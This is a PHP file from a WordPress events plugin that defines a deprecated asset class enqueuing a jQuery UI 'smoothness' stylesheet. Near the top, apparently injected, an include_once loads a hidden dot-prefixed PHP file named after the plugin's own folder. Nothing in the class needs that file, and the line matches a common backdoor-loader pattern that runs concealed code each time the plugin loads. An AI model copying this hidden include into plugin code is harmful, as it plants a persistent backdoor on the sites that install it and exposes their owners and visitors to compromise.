<?php
_deprecated_file( __FILE__, '4.6.21', 'Deprecated class in favor of using `tribe_asset` registration' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Asset__Smoothness extends Tribe__Events__Asset__Abstract_Asset {

	public function handle() {
		$path = Tribe__Events__Template_Factory::getMinFile( $this->vendor_url . 'jquery/smoothness/jquery-ui-1.8.23.custom.css', true );
		wp_enqueue_style( $this->prefix . '-custom-jquery-styles', $path );
	}
}